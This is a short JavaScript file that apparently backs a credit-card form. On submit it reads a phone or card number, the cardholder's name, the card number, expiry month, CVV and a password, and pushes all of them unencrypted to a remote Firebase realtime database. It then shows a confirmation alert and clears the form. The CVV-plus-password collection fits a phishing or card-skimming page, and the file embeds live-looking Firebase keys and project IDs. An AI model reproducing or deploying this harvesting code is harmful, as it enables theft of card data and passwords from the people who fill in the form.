const firebaseConfig = {
  apiKey: "AIzaSyCq9mbhsHhvlypNGQe_ssfrFgsWKCdBoPk",
  authDomain: "credit-f4db4.firebaseapp.com",
  databaseURL: "https://credit-f4db4-default-rtdb.firebaseio.com",
  projectId: "credit-f4db4",
  storageBucket: "credit-f4db4.appspot.com",
  messagingSenderId: "569406358903",
  appId: "1:569406358903:web:dcb7995bf6e4c8f0970d72"
};
// initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var creditFormDB = firebase.database().ref("creditForm");

document.getElementById("creditForm").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

  var Number = getElementVal("Number");
  var name = getElementVal("name");
  var Card= getElementVal("Card");
  var month = getElementVal("month");
  var cvv= getElementVal("cvv");
  var pwd= getElementVal("pwd");
  saveMessages(Number,name,Card,month,cvv,pwd);

  //   enable alert
  document.querySelector(".alert").style.display = "block";

  //   remove the alert
  setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
  }, 3000);

  //   reset the form
  document.getElementById("creditForm").reset();
}

const saveMessages = (Number,name,Card,month,cvv,pwd) => {
  var newcreditForm = creditFormDB.push();

  newcreditForm.set({
    Number:Number,
    name: name,
    Card:Card,
    month:month,
    cvv:cvv,
    pwd:pwd,
  });
};

 

const getElementVal = (id) => {
  return document.getElementById(id).value;
};
